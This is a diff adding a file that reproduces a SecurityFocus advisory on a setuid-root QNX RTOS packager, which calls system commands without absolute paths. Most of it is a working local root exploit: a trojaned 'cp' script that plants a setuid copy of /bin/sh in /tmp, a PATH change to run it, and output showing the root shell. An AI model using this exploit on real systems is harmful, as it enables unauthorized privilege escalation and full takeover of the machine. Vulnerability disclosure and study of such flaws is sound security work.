@@ -1,0 +1,32 @@
+source: http://www.securityfocus.com/bid/6146/info
+
+A vulnerability has been discovered in an application packager shipped with QNX RTOS. It should be noted that the vulnerable packager is installed setuid root by default.
+
+It has been reported that the packager fails to use absolute paths to execute system commands. This could potentially allow an attacker to trick the program into running a trojaned binary.
+
+Because the vulnerable packager is installed setuid root by default, this could allow a local attacker to take complete control over a system. 
+
+$ cat > cp <<EOF
+> #!/bin/sh
+> /bin/cp /bin/sh /tmp/sh
+> chmod 4755 /tmp/sh
+> EOF
+$ chmod 755 cp
+
+The attacker then modifies the PATH environment variable to search
+the current working directory before anything else:
+
+$ PATH=$PWD:$PATH
+
+The attacker now creates a directory and calls the packager on that
+created directory:
+
+$ mkdir temp
+$ packager temp
+...
+
+The packager will ask a number of questions. When the procedure is
+complete, a root shell will be waiting for the attacker:
+
+$ ls -l /tmp/sh
+- -rwsr-x r-x 1 root 100 153908 May 11 05:36 /tmp/sh 
